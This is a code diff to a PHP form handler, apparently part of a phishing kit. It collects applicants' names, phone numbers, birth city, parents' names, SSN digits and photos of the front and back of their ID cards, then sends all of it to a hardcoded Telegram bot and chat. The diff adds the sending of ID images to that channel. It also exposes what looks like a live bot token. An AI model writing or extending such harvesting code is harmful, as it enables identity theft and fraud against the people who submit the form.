@@ -78,6 +78,16 @@ $front_id, $back_id
 $botToken = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
 $chatId = "6513265609";
 
+// Base URL of your Render app (CHANGE THIS IF NEEDED)
+$baseUrl = "https://your-app.onrender.com/";
+
+// Convert file paths to public URLs
+$front_url = $baseUrl . $front_id;
+$back_url  = $baseUrl . $back_id;
+
+// ======================
+// SEND TEXT MESSAGE FIRST
+// ======================
 $text = "📄 New Application Submitted\n\n"
 . "👤 Name: $first_name $middle_name $last_name\n"
 . "📞 Phone: $phone\n"
@@ -87,12 +97,36 @@ $text = "📄 New Application Submitted\n\n"
 . "🏙 Birth City: $birth_city\n"
 . "👨 Father: $father_name\n"
 . "👩 Mother: $mother_name\n"
-. "🧾 SSN (last 4): $ssn\n"
-. "🪪 Front ID: $front_id\n"
-. "🪪 Back ID: $back_id\n";
+. "🧾 SSN (last 4): $ssn";
 
-file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));
+file_get_contents(
+    "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
+        "chat_id" => $chatId,
+        "text" => $text
+    ])
+);
 
+// ======================
+// SEND FRONT ID IMAGE
+// ======================
+file_get_contents(
+    "https://api.telegram.org/bot$botToken/sendPhoto?" . http_build_query([
+        "chat_id" => $chatId,
+        "photo" => $front_url,
+        "caption" => "🪪 Front ID - $first_name $last_name"
+    ])
+);
+
+// ======================
+// SEND BACK ID IMAGE
+// ======================
+file_get_contents(
+    "https://api.telegram.org/bot$botToken/sendPhoto?" . http_build_query([
+        "chat_id" => $chatId,
+        "photo" => $back_url,
+        "caption" => "🪪 Back ID - $first_name $last_name"
+    ])
+);
 // ======================
 // EMAIL NOTIFICATION
 // ======================
